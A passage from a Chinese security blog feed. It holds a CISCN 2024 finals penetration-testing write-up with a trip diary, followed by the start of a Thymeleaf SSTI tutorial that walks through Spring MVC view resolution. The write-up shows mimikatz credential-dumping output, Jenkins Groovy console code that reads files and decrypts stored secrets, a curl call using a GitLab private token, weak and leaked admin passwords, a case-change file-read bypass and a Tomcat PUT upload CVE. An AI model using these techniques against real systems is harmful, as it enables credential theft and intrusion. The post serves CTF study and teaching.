UMFD-1Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 30495 (00000000:0000771f)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : msv :tspkg :wdigest :kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:46 AMSID               : S-1-5-18msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :mimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # lsadump::dcsync /user:AdministratorERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDNmimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # creds_allERROR mimikatz_doLocal ; "creds_all" command of "standard" module not found !Module :standardFull name :Standard moduleDescription :Basic commands (does not require module name)            exit  -  Quit mimikatz             cls  -  Clear screen (doesn't work with redirections, like PsExec)          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything          coffee  -  Please, make me a coffee!           sleep  -  Sleep an amount of milliseconds             log  -  Log mimikatz input/output to file          base64  -  Switch file input/output base64         version  -  Display some version informations              cd  -  Change or display current directory       localtime  -  Displays system local date and time (OJ command)        hostname  -  Displays system local hostnamemimikatz(commandline) # exitBye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都没啥用</p><p>看别人这里是<code>net user Administrator &lt;password&gt;</code>进行密码修改，然后通过WindowsRDP进行远程桌面登陆</p><hr><h2 id="RODC（Unsolved）"><a href="#RODC（Unsolved）" class="headerlink" title="RODC（Unsolved）"></a>RODC（Unsolved）</h2><p>不懂，好像是smb密码喷洒</p><p>别的师傅的非预期：</p><p>在WIN-OPS88桌面上有一个<code>WPS OFFICE</code>，点开后查看Recent，发现了一个表格，里面有一组账号密码。</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1370778707.png" alt="2024-07-22T06:05:09.png"></p><p>由于文件名带有<code>ROAdmins</code>，很容易想到是RODC相关密码，发现这些密码均能远程登陆RODC Windows的RDP</p><p><br>可惜我没练过渗透，不然应该能想到拿完Windows的shell后要尝试下rdp的</p><hr><h2 id="Jinkens"><a href="#Jinkens" class="headerlink" title="Jinkens"></a>Jinkens</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jenkins服务</p><p>测试出账密admin:admin123可以登录进去</p><p>在Script Console里面打Groovy脚本就行</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105348773.png" alt="image-20240721105348773"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105555762.png" alt="image-20240721105555762"></p><p>那么同样的可以读flag</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">String fileContents <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\Administrator\\flag\\flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105744258.png" alt="image-20240721105744258"></p><hr><h2 id="Gitlab（TimeOut）"><a href="#Gitlab（TimeOut）" class="headerlink" title="Gitlab（TimeOut）"></a>Gitlab（TimeOut）</h2><p>靠，是原题：<a href="https://xz.aliyun.com/t/13378">https://xz.aliyun.com/t/13378</a></p><p>但是最后十分钟的时候才发现，来不及了没做完，jenkins的服务还慢得要死。。</p><p>依旧是在Jenkins里面，进入对应选项卡，点击change password</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140214428.png" alt="image-20240721140214428"></p><p>ctrl+u找到apitoken</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来用Script console解密</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token function">println</span><span class="token punctuation">(</span>hudson<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Secret<span class="token punctuation">.</span><span class="token function">fromString</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPlainText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>剩下的来不及了😭</p><br><p>有了apitoken之后就能访问gitlab的所有仓库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--header</span> <span class="token string">"PRIVATE-TOKEN: glpat-bGEgHAJDvwaPP78rsLeS"</span> <span class="token string">"http://192.168.8.42/api/v4/projects"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以获得一个巨大的返回json，通过这个json可以观察到GitLab中所有的储存库信息</p><p>直接拉下第一个<code>git clone http://oauth2:&lt;API_TOKEN&gt;@192.168.8.42/vertexsoft/vertexsoftbackup.git</code>然后里面的backups.txt就是最后GitLab的flag</p><hr><h2 id="portal（Unsolved）"><a href="#portal（Unsolved）" class="headerlink" title="portal（Unsolved）"></a>portal（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这题是modbus monitor那个服务</p><p>随便注册一个用户发现需要admin才能查看某些信息，尝试直接抓包改传入的参数</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115531554.png" alt="image-20240721115531554"></p><p>User Management下有admin的详细信息</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115747461.png" alt="image-20240721115747461"></p><p><code>admin:A1m!n@Qsx1Jn</code></p><p>头像处有个文件上传的功能，但是没啥用</p><p>User List的左上角还有一个Export List的选项可以下载文件，存在任意文件下载</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721223030799.png" alt="image-20240721223030799"></p><p>测试发现web.config被ban了</p><p>赛后得知可以直接用<strong>大小写</strong>绕过来读取..&#x2F;web.config，从而得到mssql服务的密码（注意要用admin账号）</p><p>然后数据库连上去一把梭了（？</p><hr><h2 id="WIN-PC3788（Unsolved）"><a href="#WIN-PC3788（Unsolved）" class="headerlink" title="WIN-PC3788（Unsolved）"></a>WIN-PC3788（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Tomcat8.5.71，fuzz半天只有一个&#x2F;backup&#x2F;upload</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721232402649.png" alt="image-20240721232402649"></p><p>路径下只有index.jsp</p><p>赛后得知可以PUT文件上传，或许是CVE-2017-12615：<a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><hr><h2 id="DC（Unsolved）"><a href="#DC（Unsolved）" class="headerlink" title="DC（Unsolved）"></a>DC（Unsolved）</h2><p>hint：In the real world, Control of RODC Active Directory Computer Object is dangerous</p><p><del>只要能拿下这2000分，一切都会好起来的</del></p><hr><h1 id="游记（？"><a href="#游记（？" class="headerlink" title="游记（？"></a>游记（？</h1><h2 id="day0"><a href="#day0" class="headerlink" title="day0"></a>day0</h2><p><del>（这个应该是day-1）</del>因为前一天去的机票和队友买的不是同一个时间段，导致自己一个人打车-坐动车-坐飞机-坐地铁-找酒店，最后晚上11点了才歇下来，不过成都的夜景还挺热闹的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746386030.jpg" alt="1721746386030"></p><p>（你拍的什么🐕8，糊成这样）（（（</p><p>正式开始day0，去川大报道</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798383.jpg" alt="1721746798383"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798391.jpg" alt="1721746798391"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798375.jpg" alt="1721746798375"></p><p>校园很大，有一种刘姥姥进大观园的美，感觉像是学园都市（什 </p><p>最重要的是这里没有减速带！star在装减速带这方面遥遥领先了！（x</p><p>然后就是设备测试</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747099417.jpg" alt="1721747099417"></p><p>笑点解析：下面那个才是我的热点</p><p>唉柚子厨共用一个大脑（</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747257847.jpg" alt="1721747257847"></p><p>还是校内的大楼，感觉好高级，这就是985吗orz</p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747447512.jpg" alt="1721747447512"></p><p>是 AWDP + 可信计算ctf</p><p>awdp一上来就看上了js，很快啊，ejs3.1.6，render方法，文件上传，欸这不就稳了吗</p><p>然后照着数字中国那题ssti来修这玩意，给定式思维害了，没注意到render方法里面需要传两个参数</p><p>直到第6轮的时候才凭借先知文库的找到正确的漏洞点并完成了fix，然后第8轮的时候才成功break，然后因为忙着补充wp细节还和三血失之交臂了555</p><p>最重要的是没注意到这个awdp的模式是n血分分数还会递减，会导致我们每一轮都比别人少加分</p><p>python那题本地环境起不来调试不了，感觉人都麻了</p><p>然后是去尝试fix SolonMaster，不幸地，我这阵子学的java里面刚好唯独没学fastjson，看到依赖里面有个fastjson的时候心凉了半截（</p><p>没办法只能硬给resolveClass加黑，但是我接触的java实在是太少了最终也没能修成</p><p>最后就默默吃分到了day1结束，还好js break得快能够扳回一城，不然便样衰了。。</p><p>3点结束回到酒店直接躺床上睡大觉zzz，队友倒是直接去玩了</p><p>晚上便是准备一点渗透相关的东西</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p><del>你说得对，但今天是0721，中间忘了，因为今天就是这样的日子嘛.jpg</del></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240724000510733.png" alt="image-20240724000510733"></p><p>渗透 + 车联网&amp;工控</p><p>我自然是负责前者了</p><p>什么，我做内网代理，真的假的？</p><p>到了场地之后巨魔才发现没带拓展坞于是又回去拿，而我stoaway内网代理搞不明白卡了半天，然后erp又没学过，看着大伙一个个解出erp的时候确实有点急了</p><p>好在fscan扫出来的洞是heapdump泄露，此事在我的<a href="https://c1oudfl0w0.github.io/blog/2023/10/25/0xGameCTF-Week4/#spring-%E5%A4%8D%E7%8E%B0">0xgame week4</a>中亦有记载，运气也是挺好，接下来就是一个简单的shiro利用一把梭getshell，也算是赛棍魅力时刻（</p><p>然后做代理的事情全部交给巨魔了，巨魔那边不知道为什么vps总是掉线，没办法只能来我的电脑上操作chisel代理（怎么有人开了快十个终端一个个代理啊x</p><p>后面才想起来可以直接socks代理出去，问题不大</p><p>WIN-OPS88这里不知道为什么MDUT连不上去数据库，报jdbc的错误，问题不大，我直接把里面的udf.txt顷刻炼化，手动注入便是（</p><p>Jenkins因为rwctf的时候接触过一次，看到的时候还挺兴奋x，队友测出是弱密码进入，然后我这里利用本地的先知文库找到后台groovy命令执行的方法，成功拿下</p><p>可惜在上午解出三题之后我们便没有较大进展了，浪费不少时间在portal的任意文件读取上面，忘了Windows getshell之后可以尝试rbp远程连接导致RODC没出，后面很多队都只比我们多了100分，就是差在这里</p><p>一点半的时候我开始吃午饭，同时刷着先知文库寻找突破口，在最后十五分钟的时候突然发现gitlab好像是春秋云境的原题，但是Jenkins靶机响应慢如乌龟，拼尽全力也无法及时复现，又一次血亏😭</p><p>至于WIN-PC3788，有想过是PUT文件上传但感觉版本对不上于是没去实践😭</p><p>最终的成绩是国二，也是刷新了协会的历史记录</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721702570194.jpg" alt="1721702570194"></p><p>虽然还是有点遗憾，没能在最后两小时稳住优势，但是已经足够了，所谓的 True Ending 是大家在拼尽全力之后到达的，tql各位</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721750363736.jpg" alt="1721750363736"></p><p>好了，两天的985梦结束了，归来依旧是那个臭双非（</p><p>晚宴，菜是一盘接一盘的上，红不拉几的，不过还是吃了不少才回去，yysy川剧变脸和喷火很好看，晚宴的抽奖也是被挖出鉴权0day了（</p><h2 id="后日谈"><a href="#后日谈" class="headerlink" title="后日谈"></a>后日谈</h2><p>回到酒店还是睡觉，醒来也是慢悠悠的整理东西，仔细一想我好像除了比赛根本没出过门！有点后悔结束后的第二天早上没跟着Laffey去展子玩了（我嘞个漫展特种兵</p><p>然后在床上瘫了一早上belike</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751089662.jpg" alt="1721751089662"></p><p>回去的飞机上依旧是看番度过的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277252.jpg" alt="1721751277252"></p><p>别在这里发电.jpg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277246.jpg" alt="1721751277246"></p><p>可爱捏</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2024.7.20-21	成都&lt;/p&gt;
&lt;p&gt;NISA-WhySerious	位37	全国二等奖&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Thymeleaf SSTI</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/</id>
    <published>2024-07-09T16:29:06.000Z</published>
    <updated>2024-07-11T07:27:01.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁热打铁，昨天刚学完thymeleaf引擎今天直接上注入</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p><p><a href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p><p><a href="https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">https://exp10it.io/2023/02/%E5%AF%B9-thymeleaf-ssti-%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p><span id="more"></span><p>以这个项目进行漏洞复现：<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p><p>环境jdk1.8 + springboot 2.2.0 +thymeleaf 3.0.11</p><hr><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h2><p>在<strong>Thymeleaf 3.x 版本</strong>后，新增了<code>~&#123;...&#125;</code>片段表达式，而出现SSTI问题的主要原因也在于此</p><p>复习一下语法：</p><p><code>~&#123;templatename::selector&#125;</code>**，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code></p><p>如有一个 html 文件的代码如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>banquan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2021 ThreeDream yyds<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在另一template中可以通过片段表达式引用该片段：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~&#123;footer :: banquan&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>th:insert</code>和<code>th:replace</code>插入片段是比较常见的用法</p><ul><li><code>~&#123;templatename&#125;</code>**：引用整个<code>templatename</code>模版文件作为<code>fragment</code></li><li><code>~&#123;::selector&#125;</code> 或 <code>~&#123;this::selector&#125;</code>**：引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code>。在这里，<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等</li><li><strong>当<code>~&#123;&#125;</code>片段表达式中出现<code>::</code>，那么 <code>::</code>后需要有值（也就是<code>selector</code>）</strong></li></ul><p>Thymeleaf中的<strong>预处理表达式</strong>：<code>__$&#123;expression&#125;__</code>，因为预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的payload即可达到任意代码执行</p><br><p>现在切入正题</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710173131353.png" alt="image-20240710173131353"></p><p>看这里的&#x2F;path路由：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>乍一看只是一个语言选择的参数lang，但是这里采用的是 thymeleaf 模板，就出现了问题</p><blockquote><p>在springboot + thymeleaf 中，如果视图名可控，就会导致漏洞的产生。其主要原因就是在控制器中执行 return  后，Spring 会自动调度 Thymeleaf  引擎寻找并渲染模板，在寻找的过程中，会将传入的参数当成SpEL表达式执行，从而导致了远程代码执行漏洞。</p></blockquote><p>而这里的视图名，就是lang参数，当我们传入参数值en的时候，会正常渲染这里的en&#x2F;welcome.html</p><br><p>接下来跟一下这个视图解析的过程，其实大部分都是MVC对request的处理流程，在MVC中是DispatcherServlet拦截请求并分发到Handler处理</p><h2 id="SpringMVC-视图解析过程分析"><a href="#SpringMVC-视图解析过程分析" class="headerlink" title="SpringMVC 视图解析过程分析"></a>SpringMVC 视图解析过程分析</h2><p>下断点直接定位到<code>DispatcherServlet#doDispatch</code>方法（所有的request和response都会经过该方法）</p><p>开始调试，传入<code>/path?lang=en</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181149064.png" alt="image-20240710181149064"></p><p>首先获取到了Handler消息处理，之后进入<code>doDispatch</code>方法的实现，这里重点注意下下面3个方法</p><ul><li><p><code>ha.handle()</code> ，获取ModelAndView也就是Controller中的return值</p></li><li><p><code>applyDefaultViewName()</code>，对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值</p></li><li><p><code>processDispatchResult()</code>，处理视图并<strong>解析执行表达式</strong>以及抛出异常回显部分处理</p></li></ul><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710181729565.png" alt="image-20240710181729565"></p><h3 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h3><p>先跟进到<code>ha.handle()</code></p><p>调用了&#x2F;org&#x2F;springframework&#x2F;web&#x2F;servlet&#x2F;mvc&#x2F;method&#x2F;AbstractHandlerMethodAdapter.class#handleInternal</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182306729.png" alt="image-20240710182306729"></p><p>然后继续跟，一路来到调用<code>invokeHandlerMethod</code>方法，这里就是使用Handler处理request并获取ModelAndView</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182557297.png" alt="image-20240710182557297"></p><p>跟进<code>invokeHandlerMethod</code>到调用<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710182924461.png" alt="image-20240710182924461"></p><p>跟进<code>invokeAndHandle</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183221338.png" alt="image-20240710183221338"></p><p>可以看到这里做了如下操作：</p><ul><li><p><code>invokeForRequest</code>会调用Controller后获取返回值到<code>returnValue</code>中</p><p>这里的controller是HelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断<code>returnValue</code>是否为空，如果是则继续判断<code>isRequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></p></li><li><p>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中</p></li></ul><p>总结一下，就是根据用户输入的url，调用相关的controller，并将其返回值<code>returnValue</code>，作为待查找的模板文件名，然后通过Thymeleaf模板引擎去查找，并返回给用户</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710183847319.png" alt="image-20240710183847319"></p><p>可以看到经过了<code>invokeForRequest</code>处理后return的字符串和前后缀拼接在了一起，然后在templates目录下寻找模板文件，这里找的就是<code>templates/user/en/welcome.html</code></p><p>接下来跟到<code>handleReturnValue</code>方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//获取handler</span>       <span class="token class-name">HandlerMethodReturnValueHandler</span> handler <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">selectHandler</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>handler <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Unknown return value type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>           <span 